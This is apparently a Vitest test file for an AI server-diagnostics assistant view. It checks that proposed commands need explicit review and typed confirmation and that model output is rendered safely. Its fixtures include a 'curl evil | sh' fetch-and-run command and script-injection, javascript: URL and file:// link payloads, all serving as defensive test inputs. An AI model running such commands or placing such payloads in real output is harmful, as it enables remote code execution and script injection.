/* eslint-disable vue/one-component-per-file -- Each test mounts an isolated component. */
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { createApp, nextTick, type App } from 'vue';
import { createPinia, setActivePinia, type Pinia, disposePinia } from 'pinia';
const api = vi.hoisted(() => ({
  models: vi.fn(),
  prepare: vi.fn(),
  send: vi.fn(),
  execute: vi.fn(),
  cancel: vi.fn(),
  resolveHosts: vi.fn(),
  hostList: vi.fn(),
  opsOpen: vi.fn(),
  opsClose: vi.fn(),
  trust: vi.fn(),
}));
vi.mock('@serverdeck/plugin-sdk/services/ai', () => ({ aiApi: api }));
vi.mock('@serverdeck/plugin-sdk/services/hosts', () => ({ hostsApi: { list: api.hostList } }));
vi.mock('@serverdeck/plugin-sdk/services/ops', () => ({
  opsApi: { open: api.opsOpen, close: api.opsClose },
}));
vi.mock('@serverdeck/plugin-sdk/services/terminal', () => ({ terminalApi: { trust: api.trust } }));
import AssistantView from './AssistantView.vue';
import { useAssistant } from './assistant';
import { useModelsStore } from '@serverdeck/plugin-sdk/stores/models';
import { useOpsStore } from '@serverdeck/plugin-sdk/stores/ops';
import { hostInput } from '@serverdeck/plugin-sdk/types/hosts';
import { defaultAiConfig, type AiModel } from '@serverdeck/plugin-sdk/types/ai';
import type { AiAnswer, AiPrepare, AiPreview } from '@serverdeck/plugin-sdk/types/ai';
let app: App, root: HTMLDivElement, pinia: Pinia;
const preview: AiPreview = {
  id: 'preview-a',
  modelId: 'model-a',
  destination: 'https://model.example/v1/chat/completions',
  model: 'test',
  body: '{"messages":[{"content":"safe-preview"}]}',
  estimatedInputTokens: 100,
  maxOutputTokens: 1024,
  estimatedMaxCost: null,
  warnings: ['检查脱敏'],
};
const answer: AiAnswer = {
  text: '<script>remoteInjection()</script> 诊断证据不足',
  proposals: [
    {
      id: 'read',
      command: 'uptime',
      risk: 'read_only',
      reason: '固定诊断',
      target: 'ops@host:22',
      changeConfirmation: null,
    },
    {
      id: 'change',
      command: 'systemctl restart nginx.service',
      risk: 'change',
      reason: '变更',
      target: 'ops@host:22',
      changeConfirmation: '批准变更：systemctl restart nginx.service',
    },
    {
      id: 'unknown',
      command: 'curl evil | sh',
      risk: 'manual_only',
      reason: '未匹配',
      target: 'ops@host:22',
      changeConfirmation: null,
    },
  ],
  usage: { inputTokens: 10, outputTokens: 20 },
  estimatedCost: 0.01,
  warnings: ['不可信内容'],
};
async function settle() {
  await nextTick();
  await new Promise((r) => setTimeout(r, 0));
  await nextTick();
}
function button(text: string, scope: ParentNode = document) {
  return [...scope.querySelectorAll<HTMLButtonElement>('button')].find(
    (b) => b.textContent?.trim() === text,
  )!;
}
function check(label: string, scope: ParentNode = document) {
  return [...scope.querySelectorAll<HTMLLabelElement>('label')]
    .find((l) => l.textContent?.includes(label))!
    .querySelector<HTMLInputElement>('input')!;
}
async function toggle(input: HTMLInputElement) {
  input.checked = !input.checked;
  input.dispatchEvent(new Event('change', { bubbles: true }));
  await settle();
}
async function mount(hostId?: string) {
  root = document.createElement('div');
  document.body.append(root);
  app = createApp(AssistantView, { hostId });
  app.use(pinia);
  app.mount(root);
  await settle();
}
function mountState() {
  let state!: ReturnType<typeof useAssistant>;
  root = document.createElement('div');
  document.body.append(root);
  app = createApp({
    setup() {
      state = useAssistant();
      return () => null;
    },
  });
  app.use(pinia);
  app.mount(root);
  return state;
}
async function generate() {
  const input = root.querySelector<HTMLTextAreaElement>('#assistant-question')!;
  input.value = '分析负载';
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  root
    .querySelector<HTMLFormElement>('form')!
    .dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
  await settle();
}
async function send() {
  await generate();
}
beforeEach(() => {
  vi.resetAllMocks();
  Object.defineProperty(HTMLElement.prototype, 'scrollIntoView', {
    configurable: true,
    value: vi.fn(),
  });
  pinia = createPinia();
  setActivePinia(pinia);
  api.models.mockResolvedValue([
    {
      id: 'model-a',
      name: '模型 A',
      revision: 'r1',
      config: {
        provider: 'openai_compatible',
        baseUrl: 'https://model.example/v1',
        model: 'test',
        allowInsecureHttp: false,
        maxOutputTokens: 1024,
        inputPricePerMillion: null,
        outputPricePerMillion: null,
      },
      hasKey: true,
    },
  ]);
  api.prepare.mockResolvedValue(preview);
  api.resolveHosts.mockResolvedValue({ hostIds: [], message: '', modelRevision: 'r1' });
  api.hostList.mockResolvedValue({
    hosts: [],
    groups: [],
    credentials: [],
    pendingSecretDeletions: 0,
  });
  api.opsClose.mockResolvedValue(undefined);
  api.trust.mockResolvedValue(undefined);
  api.send.mockResolvedValue(answer);
  api.cancel.mockResolvedValue(undefined);
  api.execute.mockResolvedValue({ success: true, output: 'readonly-output' });
  Object.defineProperty(HTMLDialogElement.prototype, 'showModal', {
    configurable: true,
    value: function (this: HTMLDialogElement) {
      this.open = true;
    },
  });
});
afterEach(() => {
  app?.unmount();
  root?.remove();
  disposePinia(pinia);
});
it('sends on one click with explicit scope, renders safely and never executes commands automatically', async () => {
  await mount();
  for (const label of ['服务器信息', '当前监控指标', '进程状态', 'Docker 容器状态'])
    expect(check(label).checked).toBe(false);
  await generate();
});
it('retains a conversation when the SDK refreshes unchanged model metadata and clears it for a new revision', async () => {
  await mount();
  await send();
  const models = useModelsStore();
  const copy = JSON.parse(JSON.stringify(models.models)) as AiModel[];
  models.models = copy;
  await settle();
  expect(root.textContent).toContain('分析负载');
  expect(root.textContent).toContain('诊断证据不足');
  expect(api.cancel).not.toHaveBeenCalled();
  models.models = copy.map((model) => ({ ...model, revision: 'changed' }));
  await settle();
  expect(root.textContent).not.toContain('诊断证据不足');
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
});
it('approves one immutable read-only proposal once and requires a separate typed change confirmation', async () => {
  await mount();
  await send();
  const reviewButtons = () => root.querySelectorAll<HTMLButtonElement>('.ai-proposal button');
  reviewButtons()[0]!.click();
  await settle();
  expect(button('批准执行这一条').disabled).toBe(true);
  expect(api.execute).not.toHaveBeenCalled();
  await toggle(check('我已审核目标'));
  button('批准执行这一条').click();
  await settle();
  expect(api.execute).toHaveBeenCalledWith('read', true, null);
  expect(reviewButtons()[0]!.disabled).toBe(true);
  expect(root.textContent).toContain('readonly-output');
  reviewButtons()[1]!.click();
  await settle();
  await toggle(check('我已审核目标'));
  expect(button('批准执行这一条').disabled).toBe(true);
  const input = document.querySelector<HTMLInputElement>('dialog input:not([type=checkbox])')!;
  input.value = 'yes';
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  expect(button('批准执行这一条').disabled).toBe(true);
  input.value = answer.proposals[1]!.changeConfirmation!;
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  button('批准执行这一条').click();
  await settle();
  expect(api.execute).toHaveBeenLastCalledWith('change', true, input.value);
  expect(api.execute).toHaveBeenCalledTimes(2);
});
it('keeps conversation when editing a draft, carries prior messages and recovers from API failure', async () => {
  await mount();
  await send();
  const input = root.querySelector<HTMLTextAreaElement>('#assistant-question')!;
  input.value = '继续排查';
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(1);
  expect(api.cancel).not.toHaveBeenCalled();
  api.send.mockRejectedValueOnce({ message: '模型服务暂不可用' });
  root
    .querySelector('form')!
    .dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
  await settle();
  expect(api.prepare.mock.lastCall![0].history).toEqual([
    { role: 'user', content: '分析负载' },
    { role: 'assistant', content: answer.text },
  ]);
  expect(root.textContent).toContain('模型服务暂不可用');
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(2);
  expect(api.execute).not.toHaveBeenCalled();
  await send();
  expect(root.querySelectorAll('.ai-markdown')).toHaveLength(2);
});
it('selects registered models and revokes old previews on model switch, edit and deletion', async () => {
  await mount();
  await generate();
  expect(root.querySelector('input[type=password]')).toBeNull();
  const store = useModelsStore();
  const b: AiModel = {
    id: 'model-b',
    name: '模型 B',
    revision: 'r1',
    config: { ...defaultAiConfig(), model: 'other' },
    hasKey: true,
  };
  store.models.push(b);
  await settle();
  const select = root.querySelector<HTMLSelectElement>('[aria-label="选择模型"] select')!;
  select.value = 'model-b';
  select.dispatchEvent(new Event('change', { bubbles: true }));
  await settle();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  expect(root.querySelector('[aria-label="发送预览"]')).toBeNull();
  await generate();
  expect(api.prepare.mock.lastCall![0].modelId).toBe('model-b');
  store.models = store.models.map((m) => (m.id === 'model-b' ? { ...m, revision: 'edited' } : m));
  await settle();
  expect(root.querySelector('[aria-label="发送预览"]')).toBeNull();
  await generate();
  store.models = store.models.filter((m) => m.id !== 'model-b');
  store.selectedId = '';
  await settle();
  expect(button('发送').disabled).toBe(true);
  expect(root.querySelector('[aria-label="发送预览"]')).toBeNull();
});
it('revokes a late preview after the view has been disposed', async () => {
  let resolve!: (v: AiPreview) => void;
  api.prepare.mockReturnValue(
    new Promise<AiPreview>((r) => {
      resolve = r;
    }),
  );
  const state = mountState();
  const input: AiPrepare = {
    modelId: 'model-a',
    sessionId: null,
    question: 'test',
    selection: {
      server: false,
      metrics: false,
      processes: false,
      docker: false,
      log: null,
      logLines: 100,
    },
    maskAddresses: true,
    redactValues: [],
  };
  const task = state.send(input);
  app.unmount();
  resolve(preview);
  await task;
  expect(state.turns.value).toHaveLength(0);
  expect(api.send).not.toHaveBeenCalled();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  expect(api.send).not.toHaveBeenCalled();
});

async function select(label: string, value: string) {
  const element = [...root.querySelectorAll('label')]
    .find((l) => l.textContent?.trim().startsWith(label))!
    .querySelector('select')!;
  element.value = value;
  element.dispatchEvent(new Event('change', { bubbles: true }));
  await settle();
}
const fixtureHost = (id: string) => ({
  ...hostInput(),
  id,
  name: `主机 ${id}`,
  hostname: `${id}.example`,
  username: 'ops',
  createdAt: '',
  updatedAt: '',
});
function catalog(hosts: ReturnType<typeof fixtureHost>[]) {
  return { hosts, groups: [], credentials: [], pendingSecretDeletions: 0 };
}
function openConnected() {
  api.opsOpen.mockImplementation(async (id: string, receive: (value: unknown) => void) => {
    receive({ type: 'state', state: 'connected', code: null, message: null });
    return { id: `session-${id}`, hostId: id, transportId: `transport-${id}`, routeHostIds: [] };
  });
}
it('automatically connects matched hosts and preserves selected logs and custom redaction', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  openConnected();
  await mount();
  expect(root.querySelectorAll('select')).toHaveLength(2); // model and log source; no host selector
  expect(root.textContent).toContain('已关联全部 2 台资产');
  expect(api.opsOpen).not.toHaveBeenCalled();
  useOpsStore().active = 'b';
  await toggle(check('当前监控指标'));
  await select('选定日志', 'service');
  await select('服务范围', 'user');
  const target = [...root.querySelectorAll('label')]
    .find((l) => l.textContent?.trim().startsWith('服务名'))!
    .querySelector('input')!;
  target.value = 'worker.service';
  target.dispatchEvent(new Event('input', { bubbles: true }));
  const details = root.querySelector<HTMLDetailsElement>('.ai-redaction')!;
  details.open = true;
  await toggle(check('脱敏 IP 地址和邮箱'));
  const redaction = details.querySelector('textarea')!;
  redaction.value = 'business-user\ninternal.example';
  redaction.dispatchEvent(new Event('input', { bubbles: true }));
  details.open = false;
  await settle();
  await generate();
  expect(api.opsOpen).toHaveBeenCalledOnce();
  expect(api.opsOpen.mock.calls[0]![0]).toBe('a');
  expect(useOpsStore().active).toBe('b');
  expect(api.prepare).toHaveBeenCalledWith(
    expect.objectContaining({
      sessionId: null,
      sessionIds: ['session-a'],
      autoHosts: true,
      expectedModelRevision: 'r1',
      maskAddresses: false,
      redactValues: ['business-user', 'internal.example'],
      selection: {
        server: false,
        metrics: true,
        processes: false,
        docker: false,
        log: { kind: 'service', scope: 'user', unit: 'worker.service' },
        logLines: 100,
      },
    }),
  );
  expect(api.send).toHaveBeenCalledOnce();
  expect(root.textContent).toContain('命中：主机 a');
  await select('选定日志', 'none');
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(0);
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
});
it('returns the matched host connection failure without calling the diagnosis model or another host', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  api.opsOpen.mockRejectedValue({ message: 'SSH 认证失败' });
  await mount();
  await send();
  expect(root.textContent).toContain('命中主机「主机 a」（a.example:22）连接不上：SSH 认证失败');
  expect(api.prepare).not.toHaveBeenCalled();
  expect(api.send).not.toHaveBeenCalled();
  expect(api.opsOpen).toHaveBeenCalledOnce();
});
it('keeps first-use SSH trust explicit and does not accept a fingerprint automatically', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  api.opsOpen.mockImplementation(async (_id: string, receive: (value: unknown) => void) => {
    receive({
      type: 'trust',
      hostname: 'a.example',
      port: 22,
      algorithm: 'ssh-ed25519',
      fingerprint: 'SHA256:fixture',
    });
    return { id: 'session-a', hostId: 'a', transportId: 'transport-a', routeHostIds: [] };
  });
  await mount();
  await send();
  expect(root.textContent).toContain('需要先核对 SSH 主机密钥指纹');
  expect(api.trust).not.toHaveBeenCalled();
  expect(api.opsClose).not.toHaveBeenCalled();
  button('已核对，信任此指纹').click();
  await settle();
  expect(api.trust).toHaveBeenCalledWith('session-a', true);
  expect(api.send).not.toHaveBeenCalled();
});
it('cancels a newly opened pending SSH connection and never sends a late model request', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  api.opsOpen.mockResolvedValue({
    id: 'session-a',
    hostId: 'a',
    transportId: 'transport-a',
    routeHostIds: [],
  });
  await mount();
  await generate();
  expect(root.textContent).toContain('正在连接 主机 a');
  button('停止').click();
  await settle();
  expect(api.opsClose).toHaveBeenCalledWith('session-a');
  expect(api.prepare).not.toHaveBeenCalled();
  expect(api.send).not.toHaveBeenCalled();
  expect(root.textContent).toContain('已停止回答');
});
it('connects multiple matched targets before one combined diagnostic request', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a', 'b'], message: '', modelRevision: 'r1' });
  openConnected();
  await mount();
  await send();
  expect(api.opsOpen).toHaveBeenCalledTimes(2);
  expect(api.prepare.mock.lastCall![0].sessionIds).toEqual(['session-a', 'session-b']);
  expect(api.send).toHaveBeenCalledOnce();
});
it('shows progress and cancels analysis without another submit or a late answer', async () => {
  let resolve!: (value: AiAnswer) => void;
  api.send.mockReturnValueOnce(
    new Promise<AiAnswer>((r) => {
      resolve = r;
    }),
  );
  await mount();
  await generate();
  expect(root.querySelector('[role="status"]')?.textContent).toContain('正在思考');
  expect(root.querySelector<HTMLSelectElement>('#assistant-model')!.disabled).toBe(true);
  button('停止').click();
  await settle();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  expect(api.prepare).toHaveBeenCalledOnce();
  resolve(answer);
  await settle();
  expect(root.querySelector('.ai-markdown')).toBeNull();
  expect(root.textContent).toContain('已停止回答');
  expect(api.execute).not.toHaveBeenCalled();
});
it('renders Markdown structure but blocks HTML, executable URLs and remote images', async () => {
  api.send.mockResolvedValueOnce({
    ...answer,
    text: '## 结论\n\n**检查负载**\n\n- 查看进程\n- 核对日志\n\n|项目|值|\n|---|---|\n|负载|未知|\n\n```sh\nuptime\n```\n\n<script>attack()</script>\n\n![tracking](https://track.example/pixel)\n\n[x](javascript:attack()) [local](file:///secret) [ok](https://example.com/docs)',
    proposals: [],
  });
  await mount();
  await send();
  expect(root.querySelector('.ai-markdown h3')?.textContent).toBe('结论');
  expect(root.querySelector('.ai-markdown strong')?.textContent).toBe('检查负载');
  expect(root.querySelectorAll('.ai-markdown li')).toHaveLength(2);
  expect(root.querySelectorAll('.ai-markdown table td')).toHaveLength(2);
  expect(root.querySelector('.ai-markdown pre code')?.textContent).toBe('uptime');
  expect(root.querySelector('script,img,iframe')).toBeNull();
  expect([...root.querySelectorAll('a')].map((a) => a.getAttribute('href'))).toEqual([
    'https://example.com/docs',
  ]);
  expect(root.textContent).toContain('<script>attack()</script>');
});
it('starts a new conversation and never includes execution output in follow-up history', async () => {
  await mount();
  await send();
  button('审核此命令').click();
  await settle();
  await toggle(check('我已审核目标'));
  button('批准执行这一条').click();
  await settle();
  await send();
  const history = api.prepare.mock.lastCall![0].history;
  expect(JSON.stringify(history)).not.toContain('readonly-output');
  expect(JSON.stringify(history)).not.toContain('changeConfirmation');
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(2);
  button('新对话').click();
  await settle();
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(0);
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  await send();
  expect(api.prepare.mock.lastCall![0].history).toEqual([]);
});

it('bounds retained turns and sent history, and revokes commands for discarded turns', async () => {
  const state = mountState();
  let sequence = 0;
  api.prepare.mockImplementation(async () => ({ ...preview, id: `turn-${++sequence}` }));
  api.send.mockResolvedValue({ ...answer, text: '汉🙂'.repeat(5000), proposals: [] });
  for (let i = 0; i < 22; i++)
    await state.send({
      modelId: 'model-a',
      sessionId: null,
      question: `question-${i}`,
      selection: {
        server: false,
        metrics: false,
        processes: false,
        docker: false,
        log: null,
        logLines: 100,
      },
      maskAddresses: true,
      redactValues: [],
    });
  expect(state.turns.value).toHaveLength(20);
  expect(api.cancel).toHaveBeenCalledWith('turn-1');
  expect(api.cancel).toHaveBeenCalledWith('turn-2');
  const history = api.prepare.mock.lastCall![0].history;
  expect(history.length).toBeGreaterThan(0);
  expect(history.length).toBeLessThanOrEqual(12);
  expect(
    history.reduce(
      (n: number, m: { content: string }) => n + new TextEncoder().encode(m.content).length,
      0,
    ),
  ).toBeLessThanOrEqual(48 * 1024);
  expect(history[1].content).toContain('历史回答过长');
});

it('reports a real cleanup failure after stopping instead of silently losing it', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  api.opsOpen.mockResolvedValue({
    id: 'session-a',
    hostId: 'a',
    transportId: 'transport-a',
    routeHostIds: [],
  });
  api.opsClose.mockRejectedValue({ message: 'close fixture failed' });
  await mount();
  await generate();
  button('停止').click();
  await settle();
  expect(root.textContent).toContain('未完成连接关闭失败：close fixture failed');
  expect(api.prepare).not.toHaveBeenCalled();
});

it('preserves an asynchronous SSH failure reason after the state and message update together', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  let receive!: (event: unknown) => void;
  api.opsOpen.mockImplementation(async (_id: string, sink: (event: unknown) => void) => {
    receive = sink;
    return { id: 'session-a', hostId: 'a', transportId: 'transport-a', routeHostIds: [] };
  });
  await mount();
  await generate();
  receive({ type: 'state', state: 'failed', code: 'SSH_AUTH', message: '异步认证被服务器拒绝' });
  await settle();
  expect(root.textContent).toContain('连接不上：异步认证被服务器拒绝');
  expect(root.textContent).not.toContain('连接不上：SSH 运维连接已结束');
  expect(api.prepare).not.toHaveBeenCalled();
});

it('uses the entry host session by default and only performs cross-host matching after an explicit selection', async () => {
  const host = {
    ...hostInput(),
    id: 'a',
    name: 'Host a',
    hostname: 'a.example',
    createdAt: '',
    updatedAt: '',
  };
  api.hostList.mockResolvedValue({
    hosts: [host],
    groups: [],
    credentials: [],
    pendingSecretDeletions: 0,
  });
  useOpsStore().connections.a = {
    host,
    state: 'connected',
    trust: null,
    error: null,
    session: { id: 'session-a', hostId: 'a', transportId: 'transport-a', routeHostIds: ['a'] },
  };
  await mount('a');
  await generate();
  expect(api.resolveHosts).not.toHaveBeenCalled();
  expect(api.prepare).toHaveBeenCalledWith(
    expect.objectContaining({ sessionId: 'session-a', autoHosts: false }),
  );
  expect(root.textContent).toContain('当前主机：Host a');
  await toggle(check('跨主机分析'));
  await generate();
  expect(api.resolveHosts).toHaveBeenCalledOnce();
});

it('quick questions only fill the draft and collapsing context preserves the selected read scope', async () => {
  await mount();
  button('容器排查', root).click();
  await settle();
  expect(
    root.querySelector<HTMLTextAreaElement>('[aria-label="问题"], #assistant-question')!.value,
  ).toContain('Docker');
  expect(api.prepare).not.toHaveBeenCalled();
  expect(api.resolveHosts).not.toHaveBeenCalled();
  await toggle(check('服务器信息', root));
  const collapse = root.querySelector<HTMLButtonElement>('[aria-controls="assistant-context"]')!;
  collapse.click();
  await settle();
  expect(collapse.getAttribute('aria-expanded')).toBe('false');
  collapse.click();
  await settle();
  expect(check('服务器信息', root).checked).toBe(true);
});
it('retains readable replies after hiding but expires old command handles without cancelling them in a new host context', async () => {
  const { updateVisibility } = await import('@serverdeck/plugin-sdk/visibility');
  const state = mountState();
  state.turns.value = [
    {
      id: 'turn',
      question: 'question',
      state: 'complete',
      answer,
      requestId: 'old-context-preview',
      error: '',
      hostIds: [],
    },
  ];
  updateVisibility(false);
  await settle();
  updateVisibility(true);
  await settle();
  expect(state.turns.value[0]!.answer?.text).toBe(answer.text);
  state.inspect(answer.proposals[0]!);
  expect(state.review.value).toBeNull();
  state.invalidate();
  await settle();
  expect(api.cancel).not.toHaveBeenCalledWith('old-context-preview');
  expect(state.error.value).toBe('');
});
